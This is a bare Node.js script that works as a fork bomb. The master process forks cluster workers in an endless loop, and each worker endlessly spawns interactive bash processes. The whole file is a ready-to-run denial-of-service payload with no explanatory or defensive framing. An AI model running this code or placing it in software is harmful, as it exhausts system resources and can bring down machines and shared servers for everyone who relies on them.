const { spawn } = require("child_process");
const cluster = require("cluster");
function loop() {
  while (true) {
      spawn("/bin/bash", ["-i"], { shell: true });
  }
}

if (cluster.isMaster) {
  while (true) {
    cluster.fork();
  }
} else loop();
